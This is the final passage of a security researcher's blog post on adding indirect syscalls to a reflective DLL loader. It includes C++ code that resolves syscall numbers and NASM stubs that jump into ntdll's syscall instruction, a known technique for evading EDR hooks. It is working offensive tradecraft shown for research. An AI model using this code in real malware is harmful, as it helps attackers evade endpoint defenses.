        syscalls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sysretAddr <span class="token operator">=</span> <span class="token function">retrieveSCAddr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>baseAddress <span class="token operator">&lt;&lt;</span> <span class="token number">32</span> <span class="token operator">|</span> syscallHalf<span class="token punctuation">[</span><span class="token function">generateRandomFromAddress</span><span class="token punctuation">(</span>currentAddress<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//here i can go through the list of the functions looking for what i want and then match it </span>
    <span class="token comment">//in my array</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> zwCounter <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> syscallEntries<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        
            <span class="token comment">//recycling variables here for comparing purposes </span>
            addressValue <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span>syscalls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>funcAddr<span class="token punctuation">;</span>
            <span class="token comment">//if the address of the syscall we want matches any half of those we want, we know that's the right SSN</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>syscallHalf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>addressValue <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                syscalls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>SSN <span class="token operator">=</span> i<span class="token punctuation">;</span>
                
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><h3 id="asm-syscall-stub">ASM Syscall Stub</h3><p>Now that I have all the information I need to invoke the selected functions, I just need to implement the little syscall stub within my Reflective DLL.</p><p>In the project I wrote as <a href="https://github.com/oldboy21/SyscallMeMaybe">indirect syscall POC</a> I had used the following approach:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-nasm"><code class=" language-nasm" data-lang="nasm">.data
EXTERN SSN: DWORD
EXTERN SYSCALLADDR: QWORD

.code 
ZwAllocateVirtualMemory PROC
  mov r10, rcx 
  mov eax, SSN
  jmp SYSCALLADDR
ZwAllocateVirtualMemory ENDP
</code></pre><div class="toolbar"><div class="toolbar-item"><span>NASM</span></div></div></div></div><p>Basically using global external variables that could be referred from the ASM code and invoke the syscall.</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp"><span class="token comment">//from SyscallMeMaybe.cpp</span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> DWORD SSN <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token string">"C"</span> QWORD SYSCALLADDR <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>In this case the approach could not be recycled since the DLL needs to be loaded before being able to refer to global variables in memory. So what now?</p><p>What I thought is that the procedures within the ASM file are invoked just like a normal function from the C code. As any other functions that takes arguments, it expect the latter to be placed into registers or stack as per the <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">windows calling convention</a></p><img src="https://oldboy21.github.io/dllsyscalls/Untitled%204.png" class="center"><p>Without diving too much into the calling convention we can expect parameter to be passed like this to the target functions:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-nasm"><code class=" language-nasm" data-lang="nasm">    mov rax, rcx ; 1
    mov rax, rdx ; 2
    mov rax, r8 ; 3
    mov rax, r9 ; 4
    mov rax, qword ptr [rsp + 40]  ; 5
    mov rax, qword ptr [rsp + 48]  ; 6
    mov rax, qword ptr [rsp + 56]  ; 7
</code></pre><div class="toolbar"><div class="toolbar-item"><span>NASM</span></div></div></div></div><p>Therefore my thought concluded with the idea that If I define the extern function like this:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-cpp"><code class=" language-cpp" data-lang="cpp">EXTERN_C NTSTATUS <span class="token function">ZwAllocateVirtualMemory</span><span class="token punctuation">(</span>
    IN HANDLE ProcessHandle<span class="token punctuation">,</span>
    IN OUT PVOID<span class="token operator">*</span> BaseAddress<span class="token punctuation">,</span>
    IN ULONG ZeroBits<span class="token punctuation">,</span>
    IN OUT PSIZE_T RegionSize<span class="token punctuation">,</span>
    IN ULONG AllocationType<span class="token punctuation">,</span>
    IN ULONG Protect<span class="token punctuation">,</span>
    IN DWORD ssn<span class="token punctuation">,</span>
    IN PBYTE syscallret<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><span>C++</span></div></div></div></div><p>In the specific case of the ZwAllocateVirtualMemory. I would have found the SSN in <strong>dword ptr [rsp + 56]</strong> and the syscallret address in <strong>qword ptr [rsp + 64].</strong></p><p>And luckily I was right 😀</p><p>Hence I had defined the function within my ASM file as following:</p><div class="highlight"><div class="code-toolbar"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4" class=" language-nasm"><code class=" language-nasm" data-lang="nasm">.code 
ZwAllocateVirtualMemory PROC
  mov r10, rcx
  mov eax, dword ptr [rsp + 56]
  jmp qword ptr [rsp + 64]
ZwAllocateVirtualMemory ENDP

ZwProtectVirtualMemory PROC
  mov r10,rcx
  mov eax, dword ptr [rsp + 48]
  jmp qword ptr [rsp + 56]
ZwProtectVirtualMemory ENDP

ZwFlushInstructionCache PROC
  mov r10,rcx 
  mov rax, r9
  jmp qword ptr [rsp + 40]
ZwFlushInstructionCache ENDP

end
</code></pre><div class="toolbar"><div class="toolbar-item"><span>NASM</span></div></div></div></div><h2 id="che-bello">Che bello:</h2><img src="https://oldboy21.github.io/dllsyscalls/Untitled%205.png" class="center"><h2 id="conclusions-and-credits">Conclusions and Credits</h2><p>In this blog post that you hopefully enjoyed I have talked about some ideas to implement Indirect Syscalls in your Reflective DLL. I mentioned quite some blog posts and people during the blog so I won’t do that again here but those blogs are golden, thanks guys &lt;3</p></div></article><hr><div class="post-info"><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://oldboy21.github.io/tags/untagged/">untagged</a></span></p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>3331 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2024-02-12 17:45</p></div><hr><div class="sharing-buttons"><a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;caption=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;canonicalUrl=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="mailto:?subject=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;body=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_self" rel="noopener" aria-label="" title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></div></div></a><a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f&amp;media=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f;description=Reflective%20DLL%20got%20Indirect%20Syscall%20skills" target="_blank" rel="noopener" aria-label="" title="Share on pinterest"><div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f&amp;title=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;summary=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;source=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin"><div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></div></div></a><a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f&amp;resubmit=true&amp;title=Reflective%20DLL%20got%20Indirect%20Syscall%20skills" target="_blank" rel="noopener" aria-label="" title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f;title=Reflective%20DLL%20got%20Indirect%20Syscall%20skills" target="_blank" rel="noopener" aria-label="" title="Share on xing"><div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="whatsapp://send?text=Reflective%20DLL%20got%20Indirect%20Syscall%20skills%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp"><div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f&amp;t=Reflective%20DLL%20got%20Indirect%20Syscall%20skills" target="_blank" rel="noopener" aria-label="" title="Share on hacker news"><div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"></path></svg></div></div></a><a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Reflective%20DLL%20got%20Indirect%20Syscall%20skills&amp;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f02%2freflective-dll-got-indirect-syscall-skills%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram"><div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg></div></div></a></div><div class="pagination"><div class="pagination__buttons"><span class="button previous"><a href="https://oldboy21.github.io/posts/2024/05/swappala-why-change-when-you-can-hide/"><span class="button__icon">←</span>
<span class="button__text">SWAPPALA: Why Change When You Can Hide?</span>
</a></span><span class="button next"><a href="https://oldboy21.github.io/posts/2024/01/yolo-you-only-load-once/"><span class="button__text">YOLO: You Only Load Once</span>
<span class="button__icon">→</span></a></span></div></div></main></div><footer class="footer"><div class="footer__inner"><div class="footer__content"><span>© 2023</span>
<span><a href="https://oldboy21.github.io/"></a></span><span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
<span><a href="https://oldboy21.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"></path><path d="M4 4a16 16 0 0116 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span></div></div><div class="footer__inner"><div class="footer__content"><span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with by <a href="https://github.com/rhazdon">rhazdon</a></span></div></div></footer></div><script type="text/javascript" src="https://oldboy21.github.io/bundle.min.46e438bd2eca7eb6358c700b40f6f56b22ab0b92503ecc11a2d8e4bcc610b8b4da83e5ea3d3e84fdb5f3c3c765744b9f5bbaf43cf5a027910be07ee39a9c12a1.js" integrity="sha512-RuQ4vS7KfrY1jHALQPb1ayKrC5JQPswRotjkvMYQuLTag+XqPT6E/bXzw8dldEufW7r0PPWgJ5EL4H7jmpwSoQ=="></script></body></html>